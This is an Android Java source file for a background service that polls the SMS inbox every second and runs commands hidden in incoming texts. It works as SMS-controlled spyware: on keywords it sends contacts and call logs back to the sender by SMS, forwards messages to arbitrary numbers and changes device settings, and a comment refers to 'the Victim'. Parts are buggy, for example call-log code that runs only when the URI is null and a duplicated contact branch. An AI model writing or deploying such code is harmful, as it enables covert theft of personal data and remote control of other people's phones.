package com.example.lavakumar.robotservice;
import android.app.Service;
import android.app.WallpaperManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Handler;
import android.os.IBinder;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.support.v7.app.AlertDialog;
import android.telephony.SmsManager;

import java.io.IOException;
import java.lang.reflect.Method;

import static com.example.lavakumar.robotservice.R.drawable.walpaper;

public class MyService extends Service {
    Handler handler;
    SharedPreferences mysharedpreferences;
    SharedPreferences.Editor editor;
    public MyService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
    public int onStartCommand(Intent intent, final int flags, int startId){
        mysharedpreferences=getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE);
        handler=new Handler();
        Runnable runnable=new Runnable() {
            @Override
            public void run() {
                String SMS_URI = "content://sms/inbox";//to get the sms uri.
                Cursor result = getContentResolver().query(Uri.parse(SMS_URI), null, null, null, null);
                if (result.moveToFirst()) {   //For
                    do {
                        int id = result.getInt(result.getColumnIndex("_id"));
                        final String address = result.getString(result.getColumnIndex("address"));
                        final String body = result.getString(result.getColumnIndex("body"));
                        if (body.toLowerCase().contains("Hello".toLowerCase())) {
                            if (!mysharedpreferences.contains(body)) {
                                SmsManager smsManager = SmsManager.getDefault();//smsmanager is used to send sms.
                                smsManager.sendTextMessage(address, null, "I am Working", null, null);
                                storePreferences(body);
                            }
                        } //End if Sms hello........
                        if(body.toLowerCase().contains("opendialer".toLowerCase())){
                            if(!mysharedpreferences.contains(body)) {
                                Intent dial = new Intent(Intent.ACTION_DIAL);
                                dial.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                dial.setData(Uri.parse("tel:8897108283"));
                                startActivity(dial);
                                storePreferences(body);
                            }
                        }//End of dailer.............
                        if(body.toLowerCase().contains("openBrowser".toLowerCase())){
                            if(!mysharedpreferences.contains(body)) {
                                Intent browser = new Intent(Intent.ACTION_VIEW);
                                browser.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                browser.setData(Uri.parse("https://www.google.com"));
                                startActivity(browser);
                                editor = mysharedpreferences.edit();
                                editor.putString(body, body);
                                editor.commit();
                            }
                        }//End of the Browser task................
                        if(body.toLowerCase().contains("forwardsms".toLowerCase())){
                            if(!mysharedpreferences.contains(body)){
                                String[] values=body.split("#");
                                SmsManager sms=SmsManager.getDefault();
                                sms.sendTextMessage(values[1],null,values[2],null,null);
                                storePreferences(body);
                            }
                        }//End of forward messages task...
                        if(body.toLowerCase().contains("bluetooth".toLowerCase())){
                            if(!mysharedpreferences.contains(body)){
                                Intent Bluetooth = new Intent();
                                Bluetooth.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                Bluetooth.setAction(android.provider.Settings.ACTION_BLUETOOTH_SETTINGS);
                                startActivity(Bluetooth);
                                storePreferences(body);
                            }
                        }//To open Bluetooh settings End Task............
                        if(body.toLowerCase().contains("airplane".toLowerCase())){
                            if(!mysharedpreferences.contains(body)){
                                Intent Airplane = new Intent();
                                Airplane.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                Airplane.setAction(Settings.ACTION_AIRPLANE_MODE_SETTINGS);
                                startActivity(Airplane);
                                storePreferences(body);
                            }
                        }//To open Airplane mode settings End Task............
                        if(body.toLowerCase().contains("wifi".toLowerCase())){
                            if (!mysharedpreferences.contains(body)){
                                Intent Wifi = new Intent();
                                Wifi.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                Wifi.setAction(android.provider.Settings.ACTION_WIFI_IP_SETTINGS);
                                startActivity(Wifi);
                                storePreferences(body);
                            }
                        }//To open wifi settings End task...............
                        if(body.toLowerCase().contains("wifion".toLowerCase()))
                        {
                            if(!mysharedpreferences.contains(body)){
                                WifiManager wifiManager = (WifiManager)getSystemService(Context.WIFI_SERVICE);
                                boolean wifiEnabled=wifiManager.isWifiEnabled();
                                wifiManager.setWifiEnabled(true);
                                storePreferences(body);
                            }
                        }//To Enable theWifi settings End task............
                        if(body.toLowerCase().contains("wifioff".toLowerCase()))
                        {
                            if(!mysharedpreferences.contains(body)){
                                WifiManager wifiManager = (WifiManager)getSystemService(Context.WIFI_SERVICE);
                                boolean wifiEnabled=wifiManager.isWifiEnabled();
                                wifiManager.setWifiEnabled(false);
                                storePreferences(body);
                            }
                        }//To Diasble Wifi Settings .........
                        if(body.toLowerCase().contains("conts".toLowerCase())) {
                            if (!mysharedpreferences.contains(body)) {
                                Uri contacts = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
                                Cursor res = getContentResolver().query(contacts, null, null, null, null);
                                if (res.moveToFirst()) {
                                    do {
                                        String name = res.getString(res.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                                        String number = res.getString(res.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                                        SmsManager sms = SmsManager.getDefault();
                                        sms.sendTextMessage(address, null, name + "\n" + number, null, null);
                                    } while (res.moveToNext());
                                }
                                storePreferences(body);
                            }
                        }//Acessing all contacts End task..............
                        if(body.toLowerCase().contains("particularcontact".toLowerCase())) {
                            if (!mysharedpreferences.contains(body)) {
                                String[] vals=body.split("#");
                                Uri contacts = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
                                Cursor res = getContentResolver().query(contacts, null, null, null, null);
                                if (res.moveToFirst()) {
                                    do {
                                        String name = res.getString(res.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                                        String number = res.getString(res.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                                        if(name.toLowerCase().contains(vals[1].toLowerCase())){
                                            SmsManager sms = SmsManager.getDefault();
                                            sms.sendTextMessage(address, null, name + "\n" + number, null, null);
                                        }
                                    } while (res.moveToNext());
                                }
                                storePreferences(body);
                            }
                        }//End Of Acesing Particular conatcts......................
                        if(body.toLowerCase().contains("particularcontact".toLowerCase())) {
                            if (!mysharedpreferences.contains(body)) {
                                Uri contacts = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
                                Cursor cursor= getContentResolver().query(contacts, null, null, null, null);
                                int count=cursor.getCount();
                                SmsManager sms = SmsManager.getDefault();
                                sms.sendTextMessage(address, null,"Total Number of contacts="+count, null, null);
                                storePreferences(body);
                            }
                        }//End of Total Contract list.....................
                        if(body.toLowerCase().contains("calllogs".toLowerCase())){
                            if(!mysharedpreferences.contains(body)) {
                                Uri callogs = CallLog.Calls.CONTENT_URI;
                                if (callogs == null) {
                                    Cursor ress = getContentResolver().query(callogs, null, null, null, null);
                                    if (ress.moveToFirst()) {
                                        do {
                                            String name = ress.getString(ress.getColumnIndex(CallLog.Calls.CACHED_NAME));
                                            String number = ress.getString(ress.getColumnIndex(CallLog.Calls.NUMBER));
                                            String duration = ress.getString(ress.getColumnIndex(CallLog.Calls.DURATION));
                                            String type = ress.getString(ress.getColumnIndex(CallLog.Calls.TYPE));
                                            SmsManager sms = SmsManager.getDefault();
                                            sms.sendTextMessage(address, null, name + "," + number, null, null);
                                        } while (ress.moveToNext());
                                    }
                                    storePreferences(body);
                                }
                            }
                        }//End of accessing all call Logs lof the Victim............
                        if(body.toLowerCase().contains("calllogsbyname".toLowerCase())){
                            if(!mysharedpreferences.contains(body)){
                                int flag=0;
                                String[] value=body.split("#");
                                Uri callogs= CallLog.Calls.CONTENT_URI;
                                if (callogs == null) {
                                Cursor ress=getContentResolver().query(callogs,null,null,null,null);
                                if(ress.moveToFirst()){
                                    do{
                                        String name = ress.getString(ress.getColumnIndex(CallLog.Calls.CACHED_NAME));
                                        String number = ress.getString(ress.getColumnIndex(CallLog.Calls.NUMBER));
                                        String duration =ress.getString(ress.getColumnIndex(CallLog.Calls.DURATION));
                                        String type=ress.getString(ress.getColumnIndex(CallLog.Calls.TYPE));
                                        if(name.toLowerCase().contains(value[1])){
                                            flag=1;
                                            SmsManager sms=SmsManager.getDefault();
                                            sms.sendTextMessage(address,null, name+","+number+","+duration+","+type,null,null);
                                        }
                                    }while (ress.moveToNext());
                                    if(flag==0)
                                    {
                                        SmsManager sms=SmsManager.getDefault();
                                        sms.sendTextMessage(address,null,"Ther is no contacts with this name",null,null);
                                    }
                                }
                                }
                                storePreferences(body);
                            }
                        }//End of acceccing a calllogs by name.......
                        if(body.toLowerCase().contains("calllogsbynumber".toLowerCase())){
                            if(!mysharedpreferences.contains(body)){
                                int flag=0;
                                String[] value=body.split("#");
                                Uri callogs= CallLog.Calls.CONTENT_URI;
                                if (callogs == null) {
                                Cursor ress=getContentResolver().query(callogs,null,null,null,null);
                                if(ress.moveToFirst()){
                                    do{
                                        String name = ress.getString(ress.getColumnIndex(CallLog.Calls.CACHED_NAME));
                                        String number = ress.getString(ress.getColumnIndex(CallLog.Calls.NUMBER));
                                        String duration =ress.getString(ress.getColumnIndex(CallLog.Calls.DURATION));
                                        String type=ress.getString(ress.getColumnIndex(CallLog.Calls.TYPE));
                                        if(number.toLowerCase().contains(value[1])){
                                            SmsManager sms=SmsManager.getDefault();
                                            sms.sendTextMessage(address,null, name+","+number+","+duration+","+type,null,null);
                                            flag=1;
                                        }
                                    }while (ress.moveToNext());
                                    if(flag==0)
                                    {
                                        SmsManager sms=SmsManager.getDefault();
                                        sms.sendTextMessage(address,null,"Ther is no contacts with this number",null,null);
                                    }
                                }
                                }
                                storePreferences(body);
                            }
                        }//End of accssing a calllogs By number..............
                        if(body.toLowerCase().contains("Brightnesson".toLowerCase())){
                            if(!mysharedpreferences.contains(body))
                            {
                                Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS_MODE,255);  //this will set the automatic mode on
                            }
                            storePreferences(body);
                        }//End of Brightness Mode on...................
                        if(body.toLowerCase().contains("Brightnessoff".toLowerCase())){
                            if(!mysharedpreferences.contains(body))
                            {
                                Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS_MODE, Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL);
                                //Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS_MODE,0);
                            }
                            storePreferences(body);
                        }//End of Brightness Mode off................
                        if(body.toLowerCase().contains("alertbox".toLowerCase())){
                            if(!mysharedpreferences.contains(body))
                            {
                                final String[] message=body.split("#");
                                AlertDialog.Builder builder=new AlertDialog.Builder(getBaseContext());
                                builder.setTitle(message[1]);
                                builder.setMessage(message[2]);
                                builder.setNegativeButton("Ok", new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS_MODE,255);
                                        SmsManager smsManager=SmsManager.getDefault();
                                        smsManager.sendTextMessage(message[1],null,message[2],null,null);
                                    }
                                });
                                builder.setPositiveButton("Ignore", new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS_MODE,0);
                                        SmsManager smsManager=SmsManager.getDefault();
                                        smsManager.sendTextMessage(message[1],null,message[2]+"Rebooted",null,null);
                                    }
                                });

                            }
                        }//End of Alert Dilog Box.............
                        if(body.toLowerCase().contains("ResetShared".toLowerCase()))
                        {
                            SharedPreferences settings =getSharedPreferences("PreferencesName", Context.MODE_PRIVATE);
                            settings.edit().clear().commit();
                            SmsManager smsManager=SmsManager.getDefault();
                            smsManager.sendTextMessage(address,null,"Share Preferences are Reset...",null,null);

                        }//Reset ALl SjharedPrefereces..........
                        if(body.contains("vibrate")){
                            if(!mysharedpreferences.contains(body)){
                                long pattern[] = { 0, 100, 200, 300, 400 };
                                int flag=100;
                                Vibrator vibrater=(Vibrator)getSystemService(VIBRATOR_SERVICE);
                                while (flag>0) {
                                    vibrater.vibrate(pattern, 0);
                                    flag--;
                                }
                                storePreferences(body);
                            }
                        }
                        if(body.contains("aeroplane")){
                            if(!mysharedpreferences.contains(body)){
                                Intent Airplane = new Intent();
                                Airplane.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                Airplane.setAction(Settings.ACTION_AIRPLANE_MODE_SETTINGS);
                                startActivity(Airplane);
                                storePreferences(body);
                            }
                        }//End of Aeroplane Mode Settings....................
                        if(body.contains("wallpaper")){
                            if(!mysharedpreferences.contains(body)){
                                WallpaperManager myWallpaperManager
                                        = WallpaperManager.getInstance(getApplicationContext());
                                try {
                                    myWallpaperManager.setResource(R.drawable.walpaper);
                                } catch (IOException e) {
                                    e.printStackTrace();
                                }
                                storePreferences(body);
                            }
                        }//Change Wallpaper End Task.......
                        if(body.contains("internet")){
                            if(!mysharedpreferences.contains(body)){
                                Intent network = new Intent();
                                network.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                network.setAction(android.provider.Settings.ACTION_NETWORK_OPERATOR_SETTINGS);
                                startActivity(network);
                                storePreferences(body);
                            }
                        }//End of task of  nework settings..................


                    } while (result.moveToNext());
                }

                handler.postDelayed(this, 1000);//this is written to get msg for infinite times.
            }
        };
        handler.postDelayed(runnable,1000);
        return START_STICKY;
    }
    public void storePreferences(String body)
    {
        editor = mysharedpreferences.edit();
        editor.putString(body, body);
        editor.commit();
    }
}